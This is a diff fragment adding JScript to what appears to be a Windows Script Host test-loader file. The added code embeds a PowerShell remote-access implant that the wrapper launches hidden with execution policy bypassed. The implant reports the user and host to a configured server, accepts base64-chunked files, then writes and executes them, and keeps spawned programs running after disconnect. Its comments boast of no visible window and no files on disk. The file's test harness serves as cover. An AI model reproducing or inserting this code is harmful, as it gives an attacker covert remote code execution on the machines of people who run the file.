$Username) + '|' + (_qdwujx $Hostname) + '|' + $infoLine + '|' + $pingMs + '|3.0'))" + "\n" + "      _qkeqwo 'CONNECTED|OK'" + "\n" + "" + "\n" + "      $lastHeartbeat = [DateTime]::UtcNow" + "\n" + "      $lastInfoUpdate = [DateTime]::UtcNow" + "\n" + "      $lastPing = [DateTime]::UtcNow" + "\n" + "      $lastSize = 0" + "\n" + "" + "\n" + "      $running = $true" + "\n" + "      while ($running -and $global:client.Connected) {" + "\n" + "        if (([DateTime]::UtcNow - $lastHeartbeat).TotalSeconds -ge 1.5) {" + "\n" + "          try { $global:writer.WriteLine('HEARTBEAT|' + [DateTime]::UtcNow.Ticks) } catch {}" + "\n" + "          $lastHeartbeat = [DateTime]::UtcNow" + "\n" + "        }" + "\n" + "        if (([DateTime]::UtcNow - $lastInfoUpdate).TotalSeconds -ge 10) {" + "\n" + "          try { $global:writer.WriteLine(('INFO|' + (_zcqkfe))) } catch {}" + "\n" + "          $lastInfoUpdate = [DateTime]::UtcNow" + "\n" + "        }" + "\n" + "        if (([DateTime]::UtcNow - $lastPing).TotalSeconds -ge 30) {" + "\n" + "          try { $pm = _ebsvzx $Ip; $global:writer.WriteLine('PING|' + $pm) } catch {}" + "\n" + "          $lastPing = [DateTime]::UtcNow" + "\n" + "        }" + "\n" + "" + "\n" + "        # (Outbox removido: el host ya no usa archivos txt. Todo va al DebugLog.)" + "\n" + "" + "\n" + "        $linesProcessed = 0" + "\n" + "        $loopStart = [DateTime]::UtcNow" + "\n" + "        while (([DateTime]::UtcNow - $loopStart).TotalMilliseconds -lt 500 -and $running) {" + "\n" + "          $line = $null" + "\n" + "          try {" + "\n" + "            # Leemos directamente con ReadLine. Si no hay dato, ReadLine se bloquea" + "\n" + "            # hasta que llegue algo o el ReadTimeout (60s) lo corte." + "\n" + "            # NO usamos DataAvailable porque con SslStream no es 100% confiable" + "\n" + "            # (puede haber data decrypted en el buffer interno que DataAvailable no refleja)." + "\n" + "            $line = $global:reader.ReadLine()" + "\n" + "            if ($line -eq $null) {" + "\n" + "              # EOF" + "\n" + "              _qkeqwo 'READLINE_EOF'" + "\n" + "              if (-not $global:client.Connected) { $running = $false }" + "\n" + "              break" + "\n" + "            }" + "\n" + "          } catch [System.IO.IOException] {" + "\n" + "            # TimeoutException o connection cerrada. Salimos del subloop y dejamos" + "\n" + "            # que el outer loop (con su polling de 10ms) reintente o detecte muerte." + "\n" + "            break" + "\n" + "          } catch {" + "\n" + "            _qkeqwo ('READLINE_ERR|' + $_.Exception.GetType().Name + '|' + $_.Exception.Message)" + "\n" + "            break" + "\n" + "          }" + "\n" + "          if ($line.Length -gt 0 -and $line[$line.Length - 1] -eq [char]13) {" + "\n" + "            $line = $line.Substring(0, $line.Length - 1)" + "\n" + "          }" + "\n" + "          if ($line.Length -ge 3 -and [int]$line[0] -eq 0xEF -and [int]$line[1] -eq 0xBB -and [int]$line[2] -eq 0xBF) {" + "\n" + "            $line = $line.Substring(3)" + "\n" + "          }" + "\n" + "" + "\n" + "          if ($line) {" + "\n" + "            $h = $line" + "\n" + "            if ($h.StartsWith('EXEC_FILE_START|')) {" + "\n" + "              $rest = $h.Substring(16)" + "\n" + "              $pp = $rest.Split('|',4)" + "\n" + "              if ($pp.Count -ge 4 -and $pp[2].Length -eq 32) {" + "\n" + "                $name = $pp[0]" + "\n" + "                $expectedSize = [int]$pp[1]" + "\n" + "                $expectedMd5 = $pp[2].ToLower()" + "\n" + "                $fid = $pp[3]" + "\n" + "              } else {" + "\n" + "                $pp = $rest.Split('|',3)" + "\n" + "                $name = $pp[0]" + "\n" + "                $expectedSize = [int]$pp[1]" + "\n" + "                $expectedMd5 = $null" + "\n" + "                $fid = $pp[2]" + "\n" + "              }" + "\n" + "              $global:recvFileExpectedMd5 = $expectedMd5" + "\n" + "              $ext = [System.IO.Path]::GetExtension($name)" + "\n" + "              if (-not (Test-Path $global:execDir)) { try { New-Item -ItemType Directory -Path $global:execDir -Force | Out-Null } catch {} }" + "\n" + "              $sf = Join-Path $global:execDir ('file_' + $fid + $ext)" + "\n" + "              if ($global:recvFile) { try { $global:recvFile.Dispose() } catch {} }" + "\n" + "              try {" + "\n" + "                $global:recvFile = [System.IO.File]::Create($sf)" + "\n" + "              } catch {" + "\n" + "                try { $global:writer.WriteLine(('FILE_CREATE_ERR|' + (_qdwujx $sf) + '|' + (_qdwujx $_.Exception.Message))) } catch {}" + "\n" + "                $global:recvFileExpectedMd5 = $null" + "\n" + "                continue" + "\n" + "              }" + "\n" + "              $global:recvFilePath = $sf" + "\n" + "              $global:recvFileName = $name" + "\n" + "              $global:recvFileId = $fid" + "\n" + "              $global:recvBytes = 0" + "\n" + "              $global:recvChunks = 0" + "\n" + "              $global:recvSw = [System.Diagnostics.Stopwatch]::StartNew()" + "\n" + "              try { $global:writer.WriteLine(('FILE_RECV_START|' + (_qdwujx $name) + '|' + $fid + '|' + $expectedSize)) } catch {}" + "\n" + "            } elseif ($h.StartsWith('EXEC_FILE_CHUNK|')) {" + "\n" + "              # Protocolo base64: cada chunk es una linea con EXEC_FILE_CHUNK|id|<base64data>." + "\n" + "              # El server envia N chunks + EXEC_FILE_END. Decodeamos base64 y escribimos al recvFile." + "\n" + "              $rest = $h.Substring(16)" + "\n" + "              $pp = $rest.Split('|',2)" + "\n" + "              $fid = $pp[0]" + "\n" + "              $b64 = $pp[1]" + "\n" + "              if ($global:recvFile -and $fid -eq $global:recvFileId) {" + "\n" + "                try {" + "\n" + "                  $b = [System.Convert]::FromBase64String($b64)" + "\n" + "                  $global:recvFile.Write($b, 0, $b.Length)" + "\n" + "                  $global:recvBytes += $b.Length" + "\n" + "                  $global:recvChunks++" + "\n" + "                  $global:recvFileLastChunkAt = [DateTime]::UtcNow" + "\n" + "                } catch {" + "\n" + "                  _qkeqwo ('CHUNK_DECODE_ERR|' + $_.Exception.Message)" + "\n" + "                }" + "\n" + "              } else {" + "\n" + "                # recvFile no abierto: descartar para no desincronizar" + "\n" + "              }" + "\n" + "            } elseif ($h.StartsWith('EXEC_FILE_END|')) {" + "\n" + "              $rest = $h.Substring(14)" + "\n" + "              $pp = $rest.Split('|',2)" + "\n" + "              $name = $pp[0]" + "\n" + "              $fid = $pp[1]" + "\n" + "              if ($global:recvSw) { $global:recvSw.Stop() }" + "\n" + "              _qkeqwo ('END_HANDLER|name=' + $name + '|fid=' + $fid + '|chunks=' + $global:recvChunks + '|bytes=' + $global:recvBytes)" + "\n" + "              if ($global:recvFile) { try { $global:recvFile.Flush(); $global:recvFile.Dispose() } catch {}; $global:recvFile = $null }" + "\n" + "              $sf = $global:recvFilePath" + "\n" + "              $recvMs = if ($global:recvSw) { $global:recvSw.ElapsedMilliseconds } else { 0 }" + "\n" + "              $recvMBps = if ($recvMs -gt 0) { [math]::Round(($global:recvBytes / 1024.0 / 1024.0) / ($recvMs / 1000.0), 2) } else { 0 }" + "\n" + "              try { $global:writer.WriteLine(('FILE_RECV_END|' + (_qdwujx $name) + '|' + $recvMs + '|' + $recvMBps + '|' + $global:recvChunks + '|' + $global:recvBytes)) } catch {}" + "\n" + "              $global:recvFilePath = $null" + "\n" + "              $global:recvFileName = $null" + "\n" + "              $global:recvFileId = $null" + "\n" + "" + "\n" + "              $md5Ok = $true" + "\n" + "              if ($global:recvFileExpectedMd5) {" + "\n" + "                try {" + "\n" + "                  if (Test-Path $sf) {" + "\n" + "                    $actualMd5 = (Get-FileHash -Path $sf -Algorithm MD5 -ErrorAction Stop).Hash.ToLower()" + "\n" + "                    if ($actualMd5 -ne $global:recvFileExpectedMd5) {" + "\n" + "                      try { $global:writer.WriteLine(('MD5_MISMATCH|expected=' + $global:recvFileExpectedMd5 + '|got=' + $actualMd5)) } catch {}" + "\n" + "                      try { Remove-Item $sf -Force } catch {}" + "\n" + "                      $md5Ok = $false" + "\n" + "                    } else {" + "\n" + "                      try { $global:writer.WriteLine(('MD5_OK|' + $actualMd5)) } catch {}" + "\n" + "                    }" + "\n" + "                  } else {" + "\n" + "                    $md5Ok = $false" + "\n" + "                  }" + "\n" + "                } catch {" + "\n" + "                  try { $global:writer.WriteLine(('MD5_CHECK_ERR|' + (_qdwujx $_.Exception.Message))) } catch {}" + "\n" + "                  $md5Ok = $false" + "\n" + "                }" + "\n" + "              }" + "\n" + "              $global:recvFileExpectedMd5 = $null" + "\n" + "              $global:recvSw = $null" + "\n" + "              $global:recvBytes = 0" + "\n" + "              $global:recvChunks = 0" + "\n" + "" + "\n" + "              if ($md5Ok -and (Test-Path $sf)) {" + "\n" + "                $ext = [System.IO.Path]::GetExtension($name).ToLower()" + "\n" + "                $isExe = ($ext -eq '.exe')" + "\n" + "                $status = 'LAUNCHED'" + "\n" + "                $combo = ''" + "\n" + "                try {" + "\n" + "                  if ($isExe) {" + "\n" + "                    $psi = New-Object System.Diagnostics.ProcessStartInfo" + "\n" + "                    $psi.FileName = $sf" + "\n" + "                    $psi.WorkingDirectory = $global:execDir" + "\n" + "                    # UseShellExecute=true desacopla el .exe del proceso powershell.exe:" + "\n" + "                    # si el server hace Stop y el PS1 se cierra (taskkill self), los .exe" + "\n" + "                    # spawneados SIGUEN VIVOS. Era lo que se necesitaba para que un \"Stop" + "\n" + "                    # de escuchar\" del server no mate los .exe que ya estaban corriendo en" + "\n" + "                    # la maquina remota." + "\n" + "                    $psi.UseShellExecute = $true" + "\n" + "                    $p2 = [System.Diagnostics.Process]::Start($psi)" + "\n" + "                    $combo = 'exe lanzado (PID ' + $p2.Id + ')'" + "\n" + "                    # No se puede leer .Id si UseShellExecute=true en algunas versiones de PS," + "\n" + "                    # asi que solo logueamos si esta disponible." + "\n" + "                    try { $global:spawnedPids.Add($p2.Id) } catch {}" + "\n" + "                  } else {" + "\n" + "                    $psi = New-Object System.Diagnostics.ProcessStartInfo" + "\n" + "                    $psi.WorkingDirectory = $global:execDir" + "\n" + "                    $psi.UseShellExecute = $false" + "\n" + "                    $psi.RedirectStandardOutput = $true" + "\n" + "                    $psi.RedirectStandardError = $true" + "\n" + "                    $psi.FileName = 'cmd.exe'" + "\n" + "                    $psi.Arguments = '/c \"\"' + $sf + '\"\"'" + "\n" + "                    $p2 = [System.Diagnostics.Process]::Start($psi)" + "\n" + "                    try { $global:spawnedPids.Add($p2.Id) } catch {}" + "\n" + "                    $ok = $p2.WaitForExit(30000)" + "\n" + "                    if (-not $ok) {" + "\n" + "                      try { $p2.Kill() } catch {}" + "\n" + "                      $status = 'ERR'" + "\n" + "                      $combo = '[killed after 30s]'" + "\n" + "                    } else {" + "\n" + "                      $status = 'OK'" + "\n" + "                    }" + "\n" + "                    try { $out = $p2.StandardOutput.ReadToEnd() } catch { $out = '' }" + "\n" + "                    try { $err = $p2.StandardError.ReadToEnd() } catch { $err = '' }" + "\n" + "                    $captured = ($out + $err).Trim()" + "\n" + "                    if ($captured.Length -gt 4000) { $captured = $captured.Substring(0, 4000) + '...[trunc]' }" + "\n" + "                    if ($captured) { $combo = $captured }" + "\n" + "                  }" + "\n" + "                  _qkeqwo ('FILE_EXEC_OK|pid=' + $p2.Id)" + "\n" + "                } catch {" + "\n" + "                  $status = 'ERR'" + "\n" + "                  $combo = 'no se pudo lanzar: ' + $_.Exception.Message" + "\n" + "                  _qkeqwo ('FILE_EXEC_ERR|' + $combo)" + "\n" + "                }" + "\n" + "                try { $global:writer.WriteLine(('EXEC_RESULT|' + $fid + '|' + $status + '|' + $combo)) } catch {}" + "\n" + "              } elseif (-not $md5Ok) {" + "\n" + "                _qkeqwo 'FILE_SKIPPED|md5_failed'" + "\n" + "                try { $global:writer.WriteLine(('EXEC_RESULT|' + $fid + '|ERR|md5_mismatch')) } catch {}" + "\n" + "              } else {" + "\n" + "                try { $global:writer.WriteLine(('EXEC_RESULT|' + $fid + '|ERR|no_file')) } catch {}" + "\n" + "              }" + "\n" + "            } elseif ($h.StartsWith('EXEC_RESULT|')) {" + "\n" + "              _qkeqwo ('RX_RESULT|' + $h)" + "\n" + "            } elseif ($h -eq 'REFRESH') {" + "\n" + "              try { $global:writer.WriteLine(('INFO|' + (_zcqkfe))) } catch {}" + "\n" + "              try { $pm = _ebsvzx $Ip; $global:writer.WriteLine('PING|' + $pm) } catch {}" + "\n" + "            } elseif ($h -eq 'BYE') {" + "\n" + "              _qkeqwo 'BYE_RECEIVED: server se detiene. NO mato nada. Reconecto cuando vuelva.'" + "\n" + "              $global:gracefulExit = $true" + "\n" + "              # NO llamar Kill-Spawned ni stopRequested. El socket se cierra solo," + "\n" + "              # el inner finally libera handles, y el loop de reconexion sigue vivo." + "\n" + "              # Ademas, el finally externo detecta gracefulExit y NO hace taskkill del" + "\n" + "              # proceso powershell.exe (asi los .exe spawneados con UseShellExecute=true" + "\n" + "              # siguen ejecutandose en la maquina remota)." + "\n" + "              $running = $false" + "\n" + "              break" + "\n" + "            } elseif ($h -eq 'KILLED') {" + "\n" + "              _qkeqwo 'KILLED: saliendo inmediatamente'" + "\n" + "              Kill-Spawned -exitAfter $true" + "\n" + "              $global:stopRequested = $true" + "\n" + "              $running = $false" + "\n" + "              break" + "\n" + "            } elseif ($h -eq 'KILL_ALL_SPAWNED') {" + "\n" + "              _qkeqwo 'KILL_ALL_SPAWNED: matando hijos y saliendo'" + "\n" + "              Kill-Spawned -exitAfter $true" + "\n" + "              $running = $false" + "\n" + "              break" + "\n" + "            }" + "\n" + "            $linesProcessed++" + "\n" + "          }" + "\n" + "        }" + "\n" + "" + "\n" + "        # Watchdog: si hay recvFile abierto y pasaron >30s desde el ultimo chunk, forzar END." + "\n" + "        # Antes era 3s pero disparaba antes de que llegara EXEC_FILE_END en conexiones lentas." + "\n" + "        # Subimos a 30s. Si en 30s no llega ningun chunk nuevo, asumimos que se perdio la conexion" + "\n" + "        # o el server se cayo, y finalizamos lo que tengamos." + "\n" + "        if ($running -and $global:recvFile -and $global:recvFileLastChunkAt) {" + "\n" + "          $idle = ([DateTime]::UtcNow - $global:recvFileLastChunkAt).TotalSeconds" + "\n" + "          if ($idle -gt 30) {" + "\n" + "            _qkeqwo ('WATCHDOG|' + [int]$idle + 's, forcing EXEC')" + "\n" + "            $name = $global:recvFileName" + "\n" + "            $fid = $global:recvFileId" + "\n" + "            $sf = $global:recvFilePath" + "\n" + "            if ($global:recvFile) { try { $global:recvFile.Flush(); $global:recvFile.Dispose() } catch {}; $global:recvFile = $null }" + "\n" + "            $global:recvFileLastChunkAt = $null" + "\n" + "            $global:recvFilePath = $null" + "\n" + "            $global:recvFileName = $null" + "\n" + "            $global:recvFileId = $null" + "\n" + "            $md5Ok = $true" + "\n" + "            if ($global:recvFileExpectedMd5 -and $sf) {" + "\n" + "              try {" + "\n" + "                $actualMd5 = (Get-FileHash -Path $sf -Algorithm MD5 -ErrorAction Stop).Hash.ToLower()" + "\n" + "                if ($actualMd5 -ne $global:recvFileExpectedMd5) {" + "\n" + "                  try { Remove-Item $sf -Force } catch {}" + "\n" + "                  $md5Ok = $false" + "\n" + "                }" + "\n" + "              } catch { $md5Ok = $false }" + "\n" + "            }" + "\n" + "            if ($md5Ok -and $sf -and (Test-Path $sf)) {" + "\n" + "              try { Start-Process -FilePath $sf -WorkingDirectory $global:execDir } catch {}" + "\n" + "            }" + "\n" + "          }" + "\n" + "        }" + "\n" + "" + "\n" + "        if ($linesProcessed -eq 0) {" + "\n" + "          Start-Sleep -Milliseconds 10" + "\n" + "        }" + "\n" + "      }" + "\n" + "" + "\n" + "      _qkeqwo 'DISCONNECTED'" + "\n" + "    } catch {" + "\n" + "      _qkeqwo ('CONNECT_ERROR|' + $_.Exception.Message)" + "\n" + "    } finally {" + "\n" + "      try { if ($global:recvFile) { $global:recvFile.Dispose() } } catch {}" + "\n" + "      try { if ($global:writer) { $global:writer.Flush(); $global:writer.Dispose() } } catch {}" + "\n" + "      try { if ($global:reader) { $global:reader.Dispose() } } catch {}" + "\n" + "      try { if ($global:sslStream) { $global:sslStream.Dispose() } } catch {}" + "\n" + "      try { if ($global:client) { $global:client.Close() } } catch {}" + "\n" + "      _qkeqwo 'BYE'" + "\n" + "    }" + "\n" + "" + "\n" + "    if ($global:stopRequested) {" + "\n" + "      _qkeqwo 'STOP_REQUESTED: saliendo del loop de reconexion'" + "\n" + "      break" + "\n" + "    }" + "\n" + "    # Backoff exponencial: 1s, 2s, 4s, 8s, 16s, 32s, 60s max" + "\n" + "    $global:retryDelay = [Math]::Min($global:retryDelay * 2, 60)" + "\n" + "  }" + "\n" + "} catch {" + "\n" + "  _qkeqwo ('FATAL|' + $_.Exception.Message)" + "\n" + "} finally {" + "\n" + "  try { if ($global:writer) { $global:writer.Dispose() } } catch {}" + "\n" + "  try { if ($global:reader) { $global:reader.Dispose() } } catch {}" + "\n" + "  try { if ($global:sslStream) { $global:sslStream.Dispose() } } catch {}" + "\n" + "  try { if ($global:client) { $global:client.Close() } } catch {}" + "\n" + "  _qkeqwo 'EXITING_PROCESS'" + "\n" + "  # FORZAR cierre del proceso PowerShell. Solo lo hacemos si NO fue salida graceful" + "\n" + "  # (por BYE del server cuando hace Stop de escuchar). En salida graceful dejamos" + "\n" + "  # que powershell.exe termine solo con exit 0, asi NO se mata el arbol de procesos" + "\n" + "  # y los .exe spawneados (UseShellExecute=true) sobreviven." + "\n" + "  if (-not $global:gracefulExit) {" + "\n" + "    try {" + "\n" + "      cmd.exe /c \"taskkill /F /PID $PID\" 2>$null | Out-Null" + "\n" + "    } catch {}" + "\n" + "    try {" + "\n" + "      Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue" + "\n" + "    } catch {}" + "\n" + "  }" + "\n" + "  exit 0" + "\n" + "}";
+        // =========================
+
+        // ps1_dec = PS1_TEMPLATE (modo plaintext, sin bloque de decryption).
+        var ps1_dec = PS1_TEMPLATE;
+
+        // Reemplazar el bloque param(...) con assignments literales.
+        var ps = ps1_dec.replace(/param\s*\([\s\S]*?\)/,
+            "$Ip = '" + ip + "'\n" +
+            "$Port = " + port + "\n" +
+            "$Username = '" + (envUsername || '?') + "'\n" +
+            "$Hostname = '" + (envHostname || '?') + "'\n" +
+            "$DebugLog = ''"
+        );
+
+        // Reemplazar tokens __TOK_* con valores reales.
+        ps = ps.split("__TOK_IP__").join(ip)
+               .split("__TOK_PORT__").join(String(port))
+               .split("__TOK_DEBUG_LOG__").join("");
+
+        // ===== EJECUTAR PS1 IN-MEMORY (CERO ARCHIVOS A DISCO) =====
+        // Construimos el comando powershell -Command "& { <PS1> }" y lo lanzamos via
+        // Shell.Application.ShellExecute con nShowCmd=0 (SW_HIDE nativo de la API Win32).
+        // La ventana NUNCA aparece, NINGUN archivo se escribe a disco.
+        //
+        // Por que Shell.Application.ShellExecute y NO WScript.Shell.Run/Exec/WMI:
+        //   - Run con WindowStyle=0 a veces flashea la ventana antes de ocultar.
+        //   - Exec herede la consola del WSH padre.
+        //   - WMI Create falla con error 21 (privilegios) en algunas configs.
+        //   - ShellExecute con nShowCmd=0 = SW_HIDE nativo -> sin flash.
+        var q = String.fromCharCode(34);
+
+        // Construir argumento SIN escapar comillas del PS1.
+        // PowerShell respeta las " internas porque el arg esta delimitado por " externas.
+        var argStr = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ' + q + '& { ' + ps + ' }' + q;
+
+        try {
+            var shApp = new ActiveXObject("Shell.Application");
+            // ShellExecute(exe, args, workdir, verb, nShowCmd)
+            //   verb    = "open"  -> ejecucion normal
+            //   nShowCmd= 0       -> SW_HIDE: ventana nunca aparece
+            shApp.ShellExecute("powershell.exe", argStr, "", "open", 0);
+        } catch (eShell) {
+            // Si falla, NO escribimos nada a disco (cero archivos).
+        }
+
+        // Sin Sleep: ShellExecute es asincronico, el .js termina y powershell queda corriendo.
+    } catch (ex) {
+        // Si falla, NO escribimos nada a disco (cero archivos).
+    }
+})();
+
+					
+function main(args) {
+    // EXAMPLE: cscript app.js testloader <es5_polyfills> <data\test-oss-korea-2023.json>
+    if (args.length > 0) {
+        var test_id = args[0];
+        var profilefile = args[1];
+
+        // load the test profile
+        var profile = JSON.parse(FILE.readFile(profilefile, FILE.CdoCharset.CdoUTF_8));
+
+        // do test
+        if (test_id in test_implements) {
+            var test = profile.tests.find(function(x) {
+                return (x.id == test_id);
+            });
+            var description = test.description;
+
+            console.log("Test ID: " + test_id);
+            console.log("Will be test: " + description);
+
+            try {
+                test_implements[test_id]();
+            } catch (e) {
+                console.error("ERROR: " + e.message)
+            }
+
+            console.log("Will be close this window after 90 seconds");
+            sleep(90 * 1000);
+        }
+    } else {
+        console.log("hello world!");
+    }
+}
+
+
+
+
+
